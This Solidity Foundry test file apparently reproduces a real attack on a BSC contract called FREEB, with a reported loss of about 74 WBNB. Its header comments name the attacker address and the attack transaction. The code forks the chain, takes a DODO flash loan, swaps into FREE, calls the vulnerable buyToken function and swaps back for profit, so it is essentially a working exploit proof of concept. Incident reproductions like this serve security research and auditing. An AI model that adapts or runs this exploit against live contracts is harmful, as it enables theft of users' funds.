// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~74 $WBNB
// Attacker : https://bscscan.com/address/0x835b45d38cbdccf99e609436ff38e31ac05bc502
// Attack Contract : https://bscscan.com/address/0x4512abb79f1f80830f4641caefc5ab33654a2d49
// Vulnerable Contract : https://bscscan.com/address/0xae3ada8787245977832c6dab2d4474d3943527ab
// Attack Tx : https://bscscan.com/tx/0x309523343cc1bb9d28b960ebf83175fac941b4a590830caccff44263d9a80ff0

import "forge-std/Test.sol";
import "./../interface.sol";

interface IFREEWBNBPOOL {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUSDTHACKPOOL {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
}

interface IDPPAdvanced {
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
}

interface IFREEB {
    function buyToken(uint256 listingId, uint256 expectedPaymentAmount) external;
}


contract ContractTest is Test {
    event TokenBalance(string key, uint256 val);

    IERC20 FREE = IERC20(0x8A43Eb772416f934DE3DF8F9Af627359632CB53F);
    IFREEB FREEB = IFREEB(0xAE3ADa8787245977832c6DaB2d4474D3943527Ab);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IFREEWBNBPOOL Pair = IFREEWBNBPOOL(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2);
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IDPPAdvanced DODO = IDPPAdvanced(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);

    address FREEBProxy = 0xAE3ADa8787245977832c6DaB2d4474D3943527Ab;


    function setUp() public {
        vm.createSelectFork("bsc", 35_123_711 - 1);
        vm.label(address(FREE), "FREE");
        vm.label(address(FREEB), "FREEB");
    }

    function testExploit() public {
        emit log_named_uint("Attacker WBNB balance before attack:", WBNB.balanceOf(address(this)));
        WBNB.approve(address(Router), type(uint256).max);
        DODO.flashLoan(500 * 1e18, 0, address(this), new bytes(1));
        emit log_named_uint("Attacker WBNB balance before attack:", WBNB.balanceOf(address(this)));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        require(msg.sender == address(DODO), "Fail");
        FREE.approve(address(Router), type(uint256).max);
        WBNBTOTOKEN();
        FREEB.buyToken(FREEBProxy.balance, 5 * 1e18);
        TOKENTOWBNB();
        WBNB.transfer(address(DODO), 500 * 1e18);
    }

    function WBNBTOTOKEN() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(FREE);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function TOKENTOWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(FREE);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FREE.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    fallback() external payable {}
    receive() external payable {}
}
